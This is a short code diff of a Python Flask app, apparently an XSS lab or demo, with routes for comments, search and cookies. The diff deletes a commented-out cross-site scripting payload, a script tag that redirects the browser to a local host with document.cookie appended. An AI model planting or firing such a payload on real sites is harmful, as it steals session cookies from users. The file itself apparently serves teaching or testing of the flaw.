@@ -19,8 +19,6 @@ def index():
                            comments=comments,
                            search_query=search_query)
 
-# <script>document.location='http://127.0.0.1:1000/?c='+document.cookie;</script>
-
 @app.route('/cookie/')
 def cookie():
     cookie_name = 'cookie'
